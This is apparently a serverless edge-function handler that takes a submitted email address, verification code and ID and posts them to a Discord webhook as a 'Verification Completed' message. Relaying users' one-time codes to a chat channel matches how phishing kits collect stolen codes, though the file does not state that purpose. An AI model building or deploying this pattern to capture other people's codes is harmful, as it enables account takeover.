export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  if (request.method !== 'POST') {
    return new Response(
      JSON.stringify({ error: 'Method not allowed' }),
      { status: 405, headers: { 'Content-Type': 'application/json' } }
    );
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_CODE;
  
  if (!webhookUrl) {
    return new Response(
      JSON.stringify({ error: 'Webhook URL not configured' }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }

  try {
    const body = await request.json();
    const { email, code, id } = body;

    const payload = {
      username: 'Verification Bot',
      embeds: [{
        title: '✅ Verification Completed',
        color: 0x2ecc71,
        fields: [
          { name: 'ID', value: `\`${id}\``, inline: true },
          { name: 'Email', value: `\`${email}\``, inline: true },
          { name: 'Code', value: `\`${code}\``, inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    const discordResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!discordResponse.ok) {
      throw new Error(`Discord error: ${discordResponse.status}`);
    }

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('[WEBHOOK ERROR]', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
